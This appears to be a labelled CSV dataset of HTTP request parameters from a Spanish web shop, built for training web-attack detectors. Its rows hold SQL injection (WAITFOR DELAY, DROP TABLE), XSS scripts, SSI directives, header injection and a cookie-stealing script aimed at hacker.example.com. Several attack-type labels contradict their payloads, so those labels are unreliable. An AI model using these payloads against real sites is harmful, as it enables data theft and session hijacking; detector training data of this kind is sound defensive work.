payload,attack_type,label
modo=entrar&login=gangotra&pwd=h61%E1ng19a&remember=on&B1=Entrar,normal,0
id=1123,normal,0
modo=registro&login=nathalia&password=97llAmi%2BenTo&nombre=Inocencia&apellidos=Salavedra+Castelltort&email=soldani-godet%40informex.ru&dni=54310177R&direccion=C%2F+Marroquina+16+10%3FC&ciudad=Villamuelas&cp=10858&provincia=A+Coru%F1a&ntc=6107572427974464&B1=Registrar,normal,0
modo=insertar&precioA=622&B1=Pasar+por+caja,cmdi,1
modo=insertar&precioA=7896&B1=Confirmar,cmdi,1
id=1123,normal,0
modo=registro&login=far&password=5E13Er3&nombre=Dardo&apellidos=Marola&email=si%40bunruang%40sandra%40summer.uk&dni=87896249R&direccion=Puente+De+La+Ribera+191%2C+&ciudad=Sineu&cp=37256&provincia=Burgos&ntc=4819220729146482&B1=Registrar,cmdi,1
MODO=ENTRAR&LOGIN=WYLIE&PWD=%22%3e%3c%21--%23exec+CMD%3d%22DIR+%22--%3e%3c&REMEMBER=OFF&b1=eNTRAR,sqli,1
modo=registro&login=marijke&password=hogu1ra&nombre=Canela&apellidos=Politi+Arandojo&email=pilapil%40espaciopintor.my&dni=12835645N&direccion=Porta+Cruz+De+Arqueros+145+&ciudad=Oiartzun&cp=38844&provincia=Toledo&ntc=5405560424744158&B1=Registrar,normal,0
B2=Vaciar+carrito123,normal,0
ID=%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
b2=%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e,xss,1
B2=Vaciar+carrito,normal,0
modo=entrar&login=skillen&pwd=pluTocracia&remember=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=Entrar,xss,1
modo=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&precio=8792&B1=Pasar+por+caja,xss,1
modo=entrar&login=beatty64&pwd=propaganda&remember=off&b1=entrar,normal,0
MODO=REGISTRO&LOGIN=CHATCHAI&PASSWORD=CHISMORREAR&NOMBRE=rACHID&APELLIDOS=mINGO+eLBAILE&EMAIL=SCHKORSKI%40ELXXI.ZR&DNI=26852714f&DIRECCION=pARAGUAY%2c+88%2c+5%3fe&CIUDAD=aULESTI&CP=%27%2c%270%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&PROVINCIA=lA+rIOJA&NTC=2647099047093404&b1=rEGISTRAR,sqli,1
id=3%2B&nombre=Queso+Manchego&precio=100&cantidad=75&B1=A%F1adir+al+carrito,cmdi,1
modo=entrar&login=karyn&pwd=tejera&remember=on&B1=Entrar,normal,0
errorMsg=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29123,xss,1
modo=registro&login=homan&password=5on39taci19&nombre=Salvatore&apellidos=Bonjorn+Padura&email=schonhals-lackteen%40opel-e-flex.af&dni=40389675L&direccion=Passeig+Nord+23+8B&ciudad=Sig%FCenza&cp=44370&provincia=Alicante&ntc=4433404461148186&B1=Registrar123,normal,0
modo=registro&login=yueping1&password=f9e2dora&nombre=Harissa&apellidos=Aregall+Picabea&email=goorwitz-sejbalova%40hostingprofessional.com.jobs&dni=66204492G&direccion=%22+AND+%221%22%3D%221&ciudad=Font+d%27En+Carr%F2s%2C+la&cp=29551&provincia=Huelva&ntc=3999806738331009&B1=Registrar,cmdi,1
B2=Vaciar+carritosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,normal,1
modo=registro&login=onyshko&password=5o%F17l3en48&nombre=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&apellidos=Carrabba+Sendarrubias&email=schoo_gerson%40inoxled.bf&dni=74753364Y&direccion=C%2F+Orillamar%2C+169%2C+12%3FH&ciudad=Zafra&cp=29753&provincia=Zaragoza&ntc=7596729183163278&B1=Registrar123,xss,1
modo=registro&login=jed&password=mordazmente&nombre=Theo&apellidos=Russo&email=tinti%4021horas.hr&dni=81878772Z&direccion=Calle+Poeta+Guimera%2C+2+13H&ciudad=Confrides&cp=46266&provincia=Guadalajara&ntc=2174818451824569&B1=Registrar,normal,0
modo=registro&login=lauriaul&password=er3t3e1&nombre=Fabrizzio&apellidos=Atanas%F3pulos&email=nype.shafer%40canovash.bv&dni=38355013Y&direccion=Pla%E7a+Catalunya+124%2C+5-B&ciudad=Merindad+de+R%EDo+Ubierna&cp=19312&provincia=Palencia&ntc=1437589782727245&B1=Registrar,normal,0
id=1&nombre=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=85&cantidad=78&B1=A%F1adir+al+carrito123,sqli,1
id=1&nombre=queso+manchego&precio=85&cantidad=15&b1=a%f1adir+al+carrito,normal,0
modo=registro&login=fallows&password=hidrost%E1t.ica&nombre=Florentin&apellidos=Diosdado+Pi%F1eiro&email=jones-davis%40cincocolores.cf&dni=68096192T&direccion=Calle+San+Sebastian+38%2C+&ciudad=Hontecillas&cp=09292&provincia=Burgos&ntc=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Registrar123,xss,1
modo=entrar&login=kon*omis&pwd=h%2Bolgona&remember=on&B1=Entrar,cmdi,1
modo=registro&login=grueng&password=ma*guillo&nombre=Amar-ilis&apellidos=Febo+Derch&email=hollen_farber%40bacoespecialselecci%F3n.bu&dni=71766334D&direccion=Calle+Ruise%F1or+34+&ciudad=Moreda+de+%C1lava&cp=10374&provincia=Segovia&ntc=2753265172656734&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
b2=vaciar+carrito,normal,0
MODO=ENTRAR&LOGIN=WING-MAN7%22%3e%3c%21--%23exec+CMD%3d%22DIR+%22--%3e%3c&PWD=EDIFIC9R&REMEMBER=ON&b1=eNTRAR,sqli,1
errorMsgA=Credenciales+incorrectas,normal,1
modo=insertar&precio=900&B1=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,xss,1
B2=Vaciar+carritoany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,normal,1
id=2,normal,0
id=2&nombre=Ques%2Bo+Manchego&precio=39&cantidad=84&B1=A%F1adir+al+carrito,cmdi,1
id=3&nombre=Vino+Rioja&precio=85&cantidad=66&B1=A%F1adir+al+carrito123,normal,0
modo=insertar&precio=6764&B1=Pasar+por+caja,normal,0
modo=insertar&precio=AND+1%3D1&B1=Pasar+por+caja,cmdi,1
ID=%27%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
modo=registro&login=philipa&password=c358rA&nombre=Evandro&apellidos=Inca&email=smethurst-salvador%40mcrspain.vn&dni=14638777J&direccion=Calle+Manuel+Maria+De+Arjona+80%2C+&ciudad=Fla%E7%E0&cp=27001&provincia=Toledo&ntc=0120957560122435&B1=Registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=charles2&password=b8z7&nombreA=Rufo&apellidos=Gusmerini+Aguado&email=firshman%40softwaresaas.gn&dni=11831280B&direccion=Ferreries+141%2C+9D&ciudad=Robledillo+de+Mohernando&cp=41820&provincia=Lleida&ntc=8924971122572186&B1=Registrar,cmdi,1
errorMsg=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,sqli,1
modo=entrar&login=kallewar&pwd=hi28ome458%EDa&remember=on&B1=Entrar123,normal,0
B2=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E123,xss,1
modo=entrar&login=caryn&pwd=oliv_icultora&remember=on&B1=Entrar,normal,0
modo=insertar&precio=1519&b1=pasar+por+caja,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
modo=registro&login=%22+AND+%221%22%3D%221&password=prestancIa&nombre=Dip&apellidos=Miravet+Leserre&email=bois%40awat.vi&dni=49100388B&direccion=C%2F+Maestro+Macias%2C+77%2C+3C&ciudad=Pe%F1as+de+San+Pedro&cp=46838&provincia=Lleida&ntc=8266692511685831&B1=Registrar,cmdi,1
modo=registro&login=swidersk&password=balarrasa&nombre=Yaco&apellidos=Moriana+Romanov&email=sintes%40noticiasenvivo.mz&dni=58500108E&direccion=C%2F+Parque+Iguazu+99%2C+&ciudad=Ag%FCimes&cp=48940&provincia=Valencia&ntc=3622353817159390&B1=Registrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,sqli,1
id=1,normal,0
modo=insertar&precio=4459&B1=Pasar+por+cajaSet-cookie%253A%2BTamper%253D1041264011025374727,cmdi,1
modo=entrar&login=anabal&pwdA=somn%E1mbula&remember=on&B1=Entrar,cmdi,1
B2=Vaciar+carrito,normal,0
MODO=ENTRAR&LOGIN=MATHEWS&PWD=6U1AD5%3cscript%3eALERT%28%22pAROS%22%29%3b%3c%2fscript%3e&REMEMBER=ON&b1=eNTRAR,xss,1
id=2&nombre=vino+rioja&precio=85&cantidad=87&b1=a%f1adir+al+carrito,normal,0
modo=registro&login=sameh&password=encara&nombre=Marcelino&apellidos=Mundo+Osarte&email=vanni%40sietepeines.eu&dni=60B999025N&direccion=C%2F+Eugenio+Arbones%2C+84%2C+9-G&ciudad=Daya+Vieja&cp=43770&provincia=Barcelona&ntc=7672564317265745&B1=Registrar,cmdi,1
id=2&nombre=Vino+Rioja&precio=85&cantidad=47&B1=A%F1adir+al+carrito,normal,0
id=2&nombre=Vino+Rioja&precio=85&cantidad=45&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=ba**hl&pwd=ATRabIliARio&remember=off&B1=Entrar,cmdi,1
modo=registro&login=farah&password=%21FIlatelia&nombre=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&apellidos=Mesquida+Carrasco&email=kaynak%40campodegolf.com.sc&dni=86164975Y&direccion=Calle+Pellejero+Villoria%2C+184+11%3FB&ciudad=Viveros&cp=21870&provincia=C%F3rdoba&ntc=1552564007403755&B1=Registrar,cmdi,1
B2=Vaciar+carrito,normal,0
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=44&B1=A%F1adir+al+carrito,normal,0
id=2,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=78&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=idt&password=incr%e9du69&nombre=albertina&apellidos=ballonga&email=lorenson-tordi%40youtubeanunciox.fk&dni=22446221s&direccion=caridad+82%2c+&ciudad=carmena&cp=14860&provincia=zaragoza&ntc=3805288652067342&b1=registrar,normal,0
modo=insertar&precio=9639&B1=Confirmar,normal,0
modo=registro&login=legs&password=901gI5A&nombre=Di%F3genes&apellidos=Barcel%F3+Celada&email=earl%40sutelefono.gov&dni=63732924Q&direccion=C%2F+Agustin+Lara%2C+120+2%3FD&ciudad=Terrinches&cp=08786Set-cookie%253A%2BTamper%253D1041264011025374727&provincia=Burgos&ntc=6410780518660227&B1=Registrar,cmdi,1
B2=Vaciar+carrito,normal,0
id=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
errorMsg=Credenciales+incorrectas,normal,0
id=2,normal,0
modo=registro&login=barabash0&password=quebrantamiento&nombre=Nu%F1o&apellidos=Seti%E9n+Cardona&email=ronnback.pitre%40pro-isfv.nc&dni=55842507W&direccion=Calle+El+Milagrena+S%2FN+10A&ciudad=Vilagarc%EDa+de+Arousa&cp=41457&provincia=Segovia&ntc=5533110121299997&B1=Registrar,normal,0
modo=entrar&login=joannidi&pwdA=mis9tura&remember=off&B1=Entrar,cmdi,1
modo=insertar&precio=1447&B1=Pasar+por+caja,normal,0
errorMsg=Credenciales+incorrectas,normal,0
B2=Vaciar+carrito,normal,0
modo=registro&login=knorp5&password=0orru6t5&nombre=Am%E9n&apellidos=Gorostidi+Ponce&email=cecil.wolcott7%40librodeapuntes.sv&dni=32806661J&direccion=Calle+Tanguillo+87%2C+11%3FD&ciudad=Sorzano&cp=20200&provincia=Ourense&ntc=2795669644881744&B1=Registrar,normal,0
modo=registro&login=goodman4&password=frambueso&nombre=Ivana&apellidos=Vinaixa+Calleiros&email=juornneau%40buscadordevideos.cr&dni=15785527Y&direccion=Av.+Alfonso+Puchades+S%2FN+11F&ciudad=Becilla+de+Valderaduey&cp=07260&provincia=Sevilla&ntc=2343303470283854&B1=Registrar123,normal,0
MODO=REGISTRO&LOGIN=GERHARDT8&PASSWORD=PIZMIE%2bNTA&NOMBRE=yAMILA&APELLIDOS=cARDALLIAGUET+yESCAS&EMAIL=ARMANTEL%40LASPRUEBASCONGASEOSA.VG&DNI=65724136a&DIRECCION=BOB%2540%253cscrIPT%253eALERT%2528pAROS%2529%253c%252fSCRipt%253e.PAROSPROXY.ORG&CIUDAD=oRIA&CP=17538&PROVINCIA=aLBACETE&NTC=2877016523183053&b1=rEGISTRAR,xss,1
errorMsg=Credenciales+incorrectas%2520,normal,1
B2=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=registro&login=forbes&password=m941onaria&nombre=Ido&apellidos=Sal%F3&email=delmare.seidner%40vinavilano.tn&dni=87356578W&direccion=Calle+Arins+87+4%3FE&ciudad=Ot%EDvar&cp=40315&provincia=Barcelona&ntc=3948100340900216&B1=Registrar123,normal,0
errormsga=credenciales+incorrectas,normal,1
modo=entrar&login=lamia&pwd=BUlliciosO&remember=off&B1=Entrar,normal,0
modo=entrar&login=kurio&pwd=lug5r&remember=on&B1=Entrar123,normal,0
modo=insertar&precio=9173&b1=confirmar,normal,0
id=3&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=53&b1=a%f1adir+al+carrito,normal,0
B2A=Vaciar+carrito,normal,1
modo=insertar&precio=7109&B1=Pasar+por+caja,normal,0
id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=15&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=payroll8&passwordA=ePanORToSIS&nombre=Umberto&apellidos=Latorre+Giral&email=tarron-calleta%40xavipetit.nu&dni=39712087B&direccion=Fontilles+137+4%3FG&ciudad=Vici%E9n&cp=45111&provincia=Palencia&ntc=4738747991462100&B1=Registrar,cmdi,1
B2=%2500,normal,1
modo=registro&login=mcdowall&password=7820ITuIr&nombre=Laurencio&apellidosA=Irigoyen+Bombard%F3&email=rueda.unicorn%40tiposdedrogas.je&dni=92997163K&direccion=Avenida+San+Ignacio+De+Loyola+128+8%3FC&ciudad=Chillu%E9var&cp=05279&provincia=Barcelona&ntc=0602317509119469&B1=Registrar,cmdi,1
modo=registro&login=strucche&password=corcheta&nombre=C%E1stulo&apellidos=Pelayo+Petit&email=baio%40misanimalesdomesticos.coop&dni=93042317A&direccionA=Veracruz%2C+S%2FN+2%3FF&ciudad=Manzaneda&cp=40130&provincia=Valladolid&ntc=6073015432494873&B1=Registrar,cmdi,1
modo=entrar&login=berenice&pwd=ENfEUdACI%F3n&remember=off%2F&B1=Entrar,cmdi,1
id=2&nombre=Vino+Rioja&precio=100&cantidad=52&B1=A%F1adir+al+carrito,normal,0
modo=insertar&precio=5855&B1=Confirmar123,normal,0
modo=entrar&login=dokken8&pwd=PaRLaNch%EDn&remember=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Entrar,sqli,1
b2=%27+and+%271%27%3d%271,normal,1
errormsg=%4040,normal,1
modo=insertar&precio=1902&B1=Confirmar,normal,0
B2=Vaciar+carrito,normal,0
MODO=REGISTRO&LOGIN=FAYETTE&PASSWORD=ERecTA&NOMBRE=kATERINA&APELLIDOS=mOYANO+hASB%faN&EMAIL=ROSLEY-FLAKENSTEIN%40ALQUIVIRA.AF&DNI=91432847g&DIRECCION=nAPOLS+128%2c+4c&CIUDAD=qUINTANA+DE+LA+sERENA&CP=18360&PROVINCIA=oURENSE&NTC=6775628411457968PAROS%2522%2bSTYLE%253d%2522BACKGROUND%253aURL%2528JAVASCRIPT%253aALERT%2528%2527pAROS%2527%2529%2529%26ID%3d2&b1=rEGISTRAR,xss,1
modo=entrar&login=m*udie&pwd=central2izaci%F3n&remember=on&B1=Entrar,cmdi,1
modo=insertar&precio=7839&b1=confirmar,normal,0
modo=insertar&precio=1221&B1=Confirmar,normal,0
id=1%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modo=registro&login=horng&password=Tablaz%F3N&nombre=*Aitan%2Fa&apellidos=Salguero+Peri&email=hyland%40magritte.pm&dni=64709043S&direccion=Dieciocho+De+Julio%2C+83+&ciudad=Li%E9tor&cp=11139&provincia=Valencia&ntc=9930911410161523&B1=Registrar,cmdi,1
b2=vACIAR+CARRITOPAROS%2522%2bSTYLE%253d%2522BACKGROUND%253aURL%2528JAVASCRIPT%253aALERT%2528%2527pAROS%2527%2529%2529%26ID%3d2,xss,1
MODO=REGISTRO&LOGIN=JOVO&PASSWORD=28L3RA8A&NOMBRE=hEBELEN&APELLIDOS=fORNALINO+gRIMALDI&EMAIL=OZAKI_WANAMAKER%40TRAVELZONE.TEL&DNI=75981771y&DIRECCION=cALLE+sAN+jUAN+bAUTISTA+dE+lA+sALLE+193+6%3fc&CIUDAD=cALATORAO&CP=10191&PROVINCIA=bURGOS&NTC=3393638948319901&b1=rEGISTRAR%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
modo=registro&login=nahid&password=deLi6EsCENCI1&nombre=Beda&apellidos=Tenesaca+Chaves&email=stevenson%40sitienesunawebtienesunnegocio.bs&dni=09251630H&direccion=Calle+Palmito%2C+S%2FN%2C+12%3FG&ciudad=Elantxobe&cp=16610&provincia=Teruel&ntc=3581922362739971&B1=Registrar,normal,0
B2=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modo=registro&login=jui6&password=hamaca&nombre=Adelqui&apellidos=Blaya+Varcarcel&email=bousen%40cumbareback.uk&dni=45388096B&direccion=C%2F+Virgen+De+Las+Cruces%2C+128%2C+12A%2520&ciudad=Pineda+de+Gig%FCela&cp=24921&provincia=Ciudad+Real&ntc=7123664796542745&B1=Registrar,cmdi,1
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=39&B1=A%F1adir+al+carrito123,normal,0
id=2&nombre=Jam%F3n+Ib%E9ricoparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=100&cantidad=6&B1=A%F1adir+al+carrito,xss,1
